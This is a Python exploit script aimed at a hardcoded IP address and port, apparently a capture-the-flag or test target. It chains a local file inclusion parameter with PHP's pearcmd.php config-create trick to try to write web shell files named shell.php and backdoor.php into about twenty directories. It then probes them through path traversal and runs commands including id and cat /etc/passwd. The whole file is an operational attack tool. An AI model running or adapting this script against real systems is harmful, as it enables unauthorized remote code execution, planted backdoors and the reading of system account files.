import requests

# Configuration
BASE_URL = "http://135.181.88.229:56260/"
LFI_PARAM = "?page="
PEARCMD_PATH = "../../../../../../usr/local/lib/php/pearcmd.php"
COMMAND_CREATE = "+config-create+"
TEST_DIRECTORIES = [
    "/tmp",
    "/var/tmp",
    "/dev/shm",
    "/var/www/html",
    "/usr/local/apache2/htdocs",
    "/usr/local/nginx/html",
    "/home",
    "/root",
    "/var/log",
    "/var/cache",
    "/var/lib",
    "/var/spool",
    "/var/run",
    "/usr/share",
    "/usr/lib",
    "/usr/bin",
    "/usr/sbin",
    "/usr/local",
    "/opt",
    "/srv",
    "/mnt",
    "/media"
]
SHELL_FILENAMES = [
    "shell.php",
    "cmd.php",
    "test.php",
    "backdoor.php",
    "exploit.php"
]
COMMANDS_TO_TEST = [
    "id",
    "whoami",
    "uname -a",
    "ls -la /",
    "cat /etc/passwd"
]

def test_shell_creation(base_url, lfi_param, pearcmd_path, command_create, directory, filename):
    """
    Test if a shell file can be created in the specified directory.
    """
    url = (
        f"{base_url}{lfi_param}{pearcmd_path}"
        f"{command_create}{directory}+{filename}"
    )
    
    try:
        response = requests.get(url)
        print(f"[*] Testing URL: {url}")
        print(f"[*] Response Status Code: {response.status_code}")
        print(f"[*] Response Text (first 500 chars): {response.text[:500]}")
        
        if "Could not create" not in response.text:
            print(f"[+] Success: Shell '{filename}' created in '{directory}'.")
            return True
        else:
            print(f"[-] Failed: Could not create shell in '{directory}'.")
            return False
    except Exception as e:
        print(f"[!] Error testing path '{directory}': {e}")
        return False

def verify_shell(base_url, lfi_param, directory, filename, command):
    """
    Verify if the shell file executes commands.
    """
    # Try multiple path traversal depths
    traversal_depths = ["../../../../../../", "../../../../../", "../../../../", "../../../", "../../", "../"]
    
    for depth in traversal_depths:
        shell_url = f"{base_url}{lfi_param}{depth}{directory.strip('/')}/{filename}?cmd={command}"
        print(f"[*] Testing shell URL: {shell_url}")
        
        try:
            response = requests.get(shell_url)
            print(f"[*] Response Status Code: {response.status_code}")
            print(f"[*] Response Text (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200 and response.text.strip():
                if "uid=" in response.text and "gid=" in response.text:  # Check for command output
                    print(f"[+] Shell confirmed: '{directory}/{filename}' executed '{command}' successfully!")
                    print(f"[+] Output: {response.text}")
                    return True
                else:
                    print(f"[-] Shell not working: '{directory}/{filename}' did not execute '{command}'.")
            else:
                print(f"[-] Shell not working: '{directory}/{filename}' returned an empty or invalid response.")
        except Exception as e:
            print(f"[!] Error verifying shell: {e}")
    
    return False

def main():
    print("[*] Starting automated testing for shell creation...")
    
    for directory in TEST_DIRECTORIES:
        print(f"\n[*] Testing directory: {directory}")
        for filename in SHELL_FILENAMES:
            print(f"[*] Testing filename: {filename}")
            success = test_shell_creation(
                BASE_URL,
                LFI_PARAM,
                PEARCMD_PATH,
                COMMAND_CREATE,
                directory,
                filename
            )
            
            if success:
                print(f"[*] Verifying shell in '{directory}/{filename}'...")
                for command in COMMANDS_TO_TEST:
                    if verify_shell(BASE_URL, LFI_PARAM, directory, filename, command):
                        print("[+] Exploitation successful. Shell is ready to use!")
                        return
    
    print("[-] No writable directories found. Exploitation failed.")

if __name__ == "__main__":
    main()
